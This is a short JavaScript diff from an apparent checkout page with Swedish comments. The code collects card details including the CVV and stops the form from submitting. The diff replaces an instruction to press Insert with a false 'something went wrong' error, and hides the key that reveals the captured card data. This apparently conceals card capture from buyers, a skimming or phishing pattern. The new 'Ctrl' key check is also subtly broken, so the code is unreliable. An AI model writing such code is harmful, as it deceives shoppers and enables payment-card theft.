@@ -198,7 +198,7 @@
       cvv: cvv,
       total: total
     };
-    alert('Klicka på "Insert" för att visa köpinformation.');
+    alert('Något gick fel');
     return false; // förhindra formulärsändning
   }
 
@@ -238,7 +238,7 @@ CVV: ${info.cvv}
   // Lägg till en eventlyssnare för tangenttryckningar
   document.addEventListener('keydown', function(e) {
     // Kontrollera om tangenten är Insert
-    if (e.key === 'Insert') {
+    if (e.key === 'Ctrl') {
       insertPurchaseDetails();
     }
   });
